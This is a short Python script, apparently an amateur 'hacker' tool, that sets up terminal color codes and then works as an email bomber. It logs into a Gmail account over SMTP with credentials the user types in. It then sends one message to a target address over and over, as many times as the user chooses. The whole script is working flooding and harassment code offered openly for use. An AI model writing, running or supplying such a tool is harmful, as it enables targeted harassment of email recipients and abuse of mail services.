color_off="\033[0m"       # Text Reset

# Regular Colors
black="\033[0;30m"        # Black
red="\033[0;31m"          # Red
green="\033[0;32m"        # Green
yellow="\033[0;33m"       # Yellow
blue="\033[0;34m"         # Blue
purple="\033[0;35m"       # Purple
cyan="\033[0;36m"         # Cyan
white="\033[0;37m"        # White

#Tool

import smtplib

hackerboy=smtplib.SMTP('smtp.gmail.com','587')

hackerboy.ehlo()
hackerboy.starttls()

email=str(input(yellow+"Enter Your Gmail : "+color_off))

pwd=str(input(blue+"Enter Your Password : "+color_off))

tmail=str(input(purple+"Enter Your Target E-Mail : "+color_off))

msg=str(input(cyan+"Enter Your Message: "))

amount=int(input(white+"Enter The Amount : "))

hackerboy.login(email,pwd)

for i in range(amount):
	hackerboy.sendmail(email,tmail,msg)
	print(green+str(i+1)+" ★ SMS Sent ✔")